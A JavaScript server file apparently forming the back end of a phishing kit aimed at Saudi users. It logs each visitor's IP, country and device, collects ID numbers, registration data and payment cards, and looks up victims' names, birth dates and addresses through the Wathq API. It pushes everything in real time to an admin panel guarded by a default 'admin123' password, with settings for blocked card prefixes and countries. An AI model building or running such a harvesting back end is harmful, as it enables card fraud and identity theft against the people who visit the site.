const express = require("express");
const fs = require("fs");
const path = require("path");

// Setup logging to file
const logFile = path.join(__dirname, 'backend.log');
const logStream = fs.createWriteStream(logFile, { flags: 'a' });
console.log = function(d) {
  logStream.write(new Date().toISOString() + ' [LOG] ' + d + '\n');
  process.stdout.write(d + '\n');
};
console.error = function(d) {
  logStream.write(new Date().toISOString() + ' [ERROR] ' + d + '\n');
  process.stderr.write(d + '\n');
};

const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const cookieParser = require("cookie-parser");

require("dotenv").config({ path: path.resolve(__dirname, ".env") });
console.log(`[DEBUG] WATHQ_API_KEY after dotenv config: ${process.env.WATHQ_API_KEY ? 'Loaded' : 'Not Loaded'}`);

const app = express();
const server = http.createServer(app);

// CORS Configuration
const corsOptions = {
  origin: process.env.CLIENT_URL || "*",
  credentials: true,
};

app.use(cors(corsOptions));
app.use(express.json());
app.use(cookieParser());
app.use('/admin', express.static('admin'));

// Socket.IO Configuration
const io = new Server(server, {
  cors: corsOptions,
  transports: ['websocket', 'polling'],
});

// Data file path
const DATA_DIR = process.env.NODE_ENV === 'production' ? path.join(__dirname, 'data') : path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'visitors_data.json');
const BACKUP_FILE = path.join(DATA_DIR, 'visitors_data_backup.json');

// Ensure data directory exists
function ensureDataDir() {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
      console.log(`Created data directory: ${DATA_DIR}`);
    }
  } catch (error) {
    console.error("Error creating data directory:", error);
  }
}

// Load saved data from file
function loadSavedData() {
  ensureDataDir();
  console.log(`Loading data from: ${DATA_FILE}`);
  
  try {
    // Try main file first
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from main file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
      };
    }
    
    // Try backup file if main doesn't exist
    if (fs.existsSync(BACKUP_FILE)) {
      console.log("Main file not found, trying backup...");
      const data = fs.readFileSync(BACKUP_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from backup file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
      };
    }
    
    console.log("No data file found, starting fresh");
  } catch (error) {
    console.error("Error loading saved data:", error);
    
    // Try backup on error
    try {
      if (fs.existsSync(BACKUP_FILE)) {
        console.log("Error loading main file, trying backup...");
        const data = fs.readFileSync(BACKUP_FILE, "utf8");
        const parsed = JSON.parse(data);
        return {
          visitors: new Map(Object.entries(parsed.visitors || {})),
          visitorCounter: parsed.visitorCounter || 0,
          savedVisitors: parsed.savedVisitors || [],
          whatsappNumber: parsed.whatsappNumber || "",
          globalBlockedCards: parsed.globalBlockedCards || [],
          globalBlockedCountries: parsed.globalBlockedCountries || [],
          adminPassword: parsed.adminPassword || "admin123",
        };
      }
    } catch (backupError) {
      console.error("Error loading backup:", backupError);
    }
  }
  return {
    visitors: new Map(),
    visitorCounter: 0,
    savedVisitors: [],
    whatsappNumber: "",
    globalBlockedCards: [],
    globalBlockedCountries: [],
    adminPassword: "admin123",
  };
}

// Save data to file with backup (async, non-blocking)
let saveTimer = null;
let isSaving = false;

function saveData() {
  // Debounce: wait 2 seconds before saving to batch multiple saves together
  if (saveTimer) clearTimeout(saveTimer);
  saveTimer = setTimeout(() => {
    _doSave();
  }, 2000);
}

// Force immediate save (for shutdown)
function saveDataImmediate() {
  if (saveTimer) clearTimeout(saveTimer);
  _doSaveSync();
}

// Async save - does not block the server
async function _doSave() {
  if (isSaving) return; // Skip if already saving
  isSaving = true;
  ensureDataDir();
  
  try {
    const data = {
      visitors: Object.fromEntries(visitors),
      visitorCounter,
      savedVisitors,
      whatsappNumber,
      globalBlockedCards,
      globalBlockedCountries,
      adminPassword,
      lastSaved: new Date().toISOString(),
    };
    const jsonData = JSON.stringify(data);
    
    // Async write - non-blocking
    const fsPromises = require('fs').promises;
    if (fs.existsSync(DATA_FILE)) {
      await fsPromises.copyFile(DATA_FILE, BACKUP_FILE).catch(() => {});
    }
    await fsPromises.writeFile(DATA_FILE, jsonData);
    console.log(`Data saved: ${savedVisitors.length} visitors`);
  } catch (error) {
    console.error("Error saving data:", error);
  } finally {
    isSaving = false;
  }
}

// Sync save - only for shutdown
function _doSaveSync() {
  ensureDataDir();
  try {
    const data = {
      visitors: Object.fromEntries(visitors),
      visitorCounter,
      savedVisitors,
      whatsappNumber,
      globalBlockedCards,
      globalBlockedCountries,
      adminPassword,
      lastSaved: new Date().toISOString(),
    };
    const jsonData = JSON.stringify(data);
    if (fs.existsSync(DATA_FILE)) {
      try { fs.copyFileSync(DATA_FILE, BACKUP_FILE); } catch(e) {}
    }
    fs.writeFileSync(DATA_FILE, jsonData);
    console.log(`Data saved (sync): ${savedVisitors.length} visitors`);
  } catch (error) {
    console.error("Error saving data (sync):", error);
  }
}

// Initialize data from file
const savedData = loadSavedData();
const visitors = new Map(); // Start with empty Map - no sockets connected on fresh start
const admins = new Map();
let visitorCounter = savedData.visitorCounter;
let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for footer
let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global blocked countries
let adminPassword = savedData.adminPassword || "admin123"; // Admin password (persisted)

const axios = require("axios");

const wathqApiRequest = async (path, method = "GET", data = null) => {
  console.log(`[Wathq API] Requesting: ${path}, Method: ${method}, Data: ${JSON.stringify(data)}`);
  const WATHQ_API_KEY = process.env.WATHQ_API_KEY;
  console.log(`[DEBUG] Inside wathqApiRequest - WATHQ_API_KEY: ${WATHQ_API_KEY ? 'Loaded' : 'Not Loaded'}`);
  if (!WATHQ_API_KEY) {
    console.error("[Wathq API] WATHQ_API_KEY is not set in environment variables.");
    throw new Error("Wathq API key is not configured.");
  }

  try {
    const config = {
      method: method,
      url: `https://api.wathq.sa${path}`,
      headers: {
        "Content-Type": "application/json",
        "apiKey": WATHQ_API_KEY,
      },
      data: data,
    };
    const response = await axios(config);
    console.log(`[Wathq API] Response for ${path}: Status: ${response.status}, Data: ${JSON.stringify(response.data)}`);
    return response.data;
  } catch (error) {
    if (error.response) {
      console.error(`[Wathq API] Error Response Status: ${error.response.status}, Status Text: ${error.response.statusText}, Response Data: ${JSON.stringify(error.response.data)}`);
      throw new Error(`Wathq API error: ${error.response.status} ${error.response.statusText} - ${JSON.stringify(error.response.data)}`);
    } else if (error.request) {
      console.error(`[Wathq API] No response received for ${path}: ${error.message}`);
      throw new Error(`Wathq API error: No response received - ${error.message}`);
    } else {
      console.error(`[Wathq API] Error setting up request for ${path}: ${error.message}`);
      throw new Error(`Wathq API error: Request setup failed - ${error.message}`);
    }
  }
};


// CRITICAL: On server startup, mark ALL saved visitors as disconnected
// No sockets are connected when server starts fresh
savedVisitors.forEach(v => {
  v.isConnected = false;
});
console.log(`Marked all ${savedVisitors.length} saved visitors as disconnected on startup`);

// Generate unique API key
function generateApiKey() {
  return "api_" + Math.random().toString(36).substring(2, 15);
}

// Get visitor info from request
function getVisitorInfo(socket) {
  const headers = socket.handshake.headers;
  // Get the last IP from x-forwarded-for (the external/public IP)
  let ip = headers["x-forwarded-for"] || socket.handshake.address;
  if (ip && ip.includes(",")) {
   const ips = ip.split(",").map(i => i.trim());
    ip = ips[ips.length - 1]; // Use the last IP (external)
  }
  return {
    ip: ip,
    userAgent: headers["user-agent"] || "",
    country: headers["cf-ipcountry"] || "Unknown",
  };
}

// Check if user agent is a bot or crawler - COMPREHENSIVE BLOCKING
// Bot check DISABLED
function isBot(ua) {
  return false;
}

// Visitor validation DISABLED - allow everyone
function isValidVisitor(ua) {
  return true;
}

// Parse user agent
function parseUserAgent(ua) {
  let os = "Unknown";
  let device = "Unknown";
  let browser = "Unknown";

  // OS Detection
  if (ua.includes("Windows")) os = "Windows";
  else if (ua.includes("Mac")) os = "macOS";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

  // Device Detection
  if (ua.includes("Mobile")) device = "Mobile";
  else if (ua.includes("Tablet")) device = "Tablet";
  else device = "Desktop";

  // Browser Detection
  if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari")) browser = "Safari";
  else if (ua.includes("Edge")) browser = "Edge";

  return { os, device, browser };
}

// Save visitor to permanent storage
function saveVisitorPermanently(visitor) {
  const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
  if (existingIndex >= 0) {
    const existing = savedVisitors[existingIndex];
    // Deep merge: preserve arrays by keeping the longer/more complete version
    const merged = { ...existing, ...visitor };
    
    // For critical arrays, always keep the one with more entries
    if (existing.dataHistory && visitor.dataHistory) {
      merged.dataHistory = existing.dataHistory.length >= visitor.dataHistory.length 
        ? [...existing.dataHistory] : [...visitor.dataHistory];
    }
    if (existing.paymentCards && visitor.paymentCards) {
      merged.paymentCards = existing.paymentCards.length >= visitor.paymentCards.length 
        ? [...existing.paymentCards] : [...visitor.paymentCards];
    }
    savedVisitors[existingIndex] = merged;
  } else {
    savedVisitors.push(visitor);
  }
  saveData();
}

// Update visitor data
function updateVisitorData(socketId, data) {
  const visitor = visitors.get(socketId);
  if (visitor) {
    Object.assign(visitor, data);
    saveVisitorPermanently(visitor);
    broadcastAdminState();
  }
}

// Broadcast updated state to all admin clients
function broadcastAdminState() {
  const state = {
    visitors: Array.from(visitors.values()),
    savedVisitors: savedVisitors,
    visitorCount: visitors.size,
    savedVisitorCount: savedVisitors.length,
    whatsappNumber: whatsappNumber,
    globalBlockedCards: globalBlockedCards,
    globalBlockedCountries: globalBlockedCountries,
  };
  admins.forEach(adminSocket => {
    adminSocket.emit('admin-state', state);
  });
}

// Handle new socket connections
io.on('connection', (socket) => {
  const visitorInfo = getVisitorInfo(socket);
  console.log(`New connection from ${visitorInfo.ip} (${visitorInfo.country}) with user agent: ${visitorInfo.userAgent}`);

  // Disconnect if it's a bot or invalid user agent
  if (!isValidVisitor(visitorInfo.userAgent)) {
    console.log(`[BLOCK] Invalid visitor, disconnecting: ${visitorInfo.userAgent}`);
    socket.disconnect();
    return;
  }

  // Handle admin connections
  if (socket.handshake.query.isAdmin) {
    socket.on('admin-login', (password) => {
      if (password === adminPassword) {
        console.log('Admin logged in');
        admins.set(socket.id, socket);
        socket.emit('admin-login-success');
        broadcastAdminState();
      } else {
        socket.emit('admin-login-fail');
      }
    });

    socket.on('get-admin-state', () => {
      broadcastAdminState();
    });

    socket.on('update-settings', (settings) => {
      if (admins.has(socket.id)) {
        console.log('Updating settings:', settings);
        if (settings.whatsappNumber) whatsappNumber = settings.whatsappNumber;
        if (settings.globalBlockedCards) globalBlockedCards = settings.globalBlockedCards;
        if (settings.globalBlockedCountries) globalBlockedCountries = settings.globalBlockedCountries;
        if (settings.adminPassword) adminPassword = settings.adminPassword;
        saveData();
        broadcastAdminState();
      }
    });

    socket.on('disconnect', () => {
      admins.delete(socket.id);
      console.log('Admin disconnected');
    });

    return; // Don't process as a regular visitor
  }

  // Handle regular visitor connections
  let visitorId = socket.handshake.query.visitorId;
  let isNewVisitor = false;

  let visitor = savedVisitors.find(v => v._id === visitorId);

  if (visitor) {
    console.log(`Returning visitor: ${visitorId}`);
    visitor.isConnected = true;
    visitor.socketId = socket.id;
    visitor.lastSeen = new Date().toISOString();
    Object.assign(visitor, visitorInfo, parseUserAgent(visitorInfo.userAgent));
  } else {
    visitorId = `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
    visitor = {
      _id: visitorId,
      socketId: socket.id,
      ...visitorInfo,
      ...parseUserAgent(visitorInfo.userAgent),
      idNumber: null,
      crNumber: null,
      personalData: {},
      nationalAddress: {},
      crData: {},
      gosiData: {},
      dataHistory: [],
      paymentCards: [],
      isConnected: true,
      firstSeen: new Date().toISOString(),
      lastSeen: new Date().toISOString(),
      isIdle: false,
    };
    savedVisitors.push(visitor);
    isNewVisitor = true;
    console.log(`New visitor registered: ${visitor._id}`);
  }

  visitors.set(socket.id, visitor);
  saveData();

  // If idNumber is available, fetch personal data from Wathq and emit to client
  if (visitor.idNumber) {
    (async () => {
      try {
        console.log(`[WATHQ] Fetching personal data for ID: ${visitor.idNumber}`);
        console.log(`[BACKEND] Attempting to fetch personal info from Wathq API for idNumber: ${visitor.idNumber}`);
        console.log(`[Wathq API Call] Requesting personal info for ID: ${visitor.idNumber}`);
        const personalInfoResult = await wathqApiRequest(`/v4/individuals/${visitor.idNumber}`);
        console.log(`[Wathq API Call] Received personal info result: ${JSON.stringify(personalInfoResult)}`);
        let personalData = {};

        if (personalInfoResult.statusCode === 200 && personalInfoResult.body) {
          console.log(`[WATHQ] Raw Response Body for Personal Info: ${personalInfoResult.body}`);
          const parsedInfo = JSON.parse(personalInfoResult.body);
          personalData = {
            arabicName: parsedInfo.fullName || '',
            englishName: parsedInfo.englishFullName || '',
            dateOfBirth: parsedInfo.dateOfBirth || '',
            gender: parsedInfo.gender || '',
            nationality: parsedInfo.nationality?.name || '',
            idNumber: visitor.idNumber,
          };
          console.log(`[WATHQ] Personal Info fetched for ${visitor.idNumber}:`, personalData);
        } else {
          console.error(`[WATHQ] Failed to fetch personal info for ${visitor.idNumber}. Status: ${personalInfoResult.statusCode}, Body: ${personalInfoResult.body}`);
        }

        // Fetch national address
        console.log(`[BACKEND] Attempting to fetch national address from Wathq API for idNumber: ${visitor.idNumber}`);
        console.log(`[Wathq API Call] Requesting national address for ID: ${visitor.idNumber}`);
        const nationalAddressResult = await wathqApiRequest(`/v4/individuals/national-address/${visitor.idNumber}`);
        console.log(`[Wathq API Call] Received national address result: ${JSON.stringify(nationalAddressResult)}`);
        let nationalAddress = {};
        if (nationalAddressResult.statusCode === 200 && nationalAddressResult.body) {
          console.log(`[WATHQ] Raw Response Body for National Address: ${nationalAddressResult.body}`);
          const parsedAddress = JSON.parse(nationalAddressResult.body);
          nationalAddress = {
            buildingNumber: parsedAddress.buildingNumber || '',
            streetName: parsedAddress.streetName || '',
            districtName: parsedAddress.districtName || '',
            cityName: parsedAddress.cityName || '',
            zipCode: parsedAddress.zipCode || '',
            additionalNumber: parsedAddress.additionalNumber || '',
            unitNumber: parsedAddress.unitNumber || '',
          };
          console.log(`[WATHQ] National Address fetched for ${visitor.idNumber}:`, nationalAddress);
        } else {
          console.error(`[WATHQ] Failed to fetch national address for ${visitor.idNumber}. Status: ${nationalAddressResult.statusCode}, Body: ${nationalAddressResult.body}`);
        }

        // Update visitor data and emit
        updateVisitorData(socket.id, { personalData, nationalAddress });
        console.log(`[Socket Emit] Emitting 'personalData' to client for visitor ${visitor.idNumber}: Personal Data: ${JSON.stringify(personalData)}, National Address: ${JSON.stringify(nationalAddress)}`);
        socket.emit("personalData", { personalData, nationalAddress });

      } catch (error) {
        console.error('Error fetching data from Wathq:', error);
        console.error(`[Socket Emit] Emitting 'dataError' to client for visitor ${visitor.idNumber}: ${error.message}`);
        socket.emit("dataError", { message: "Failed to fetch data from Wathq" });
      }
    })();
  }

  socket.emit('visitorId', visitorId);
  broadcastAdminState();

  socket.on('updateData', (data) => {
    console.log(`Received data update from ${visitor._id}:`, data);
    updateVisitorData(socket.id, data);
  });

  socket.on('disconnect', () => {
    console.log(`Visitor disconnected: ${visitor._id}`);
    const v = visitors.get(socket.id);
    if (v) {
      v.isConnected = false;
      v.lastSeen = new Date().toISOString();
      saveVisitorPermanently(v);
    }
    visitors.delete(socket.id);
    broadcastAdminState();
  });
});

// ... (rest of the file remains the same)
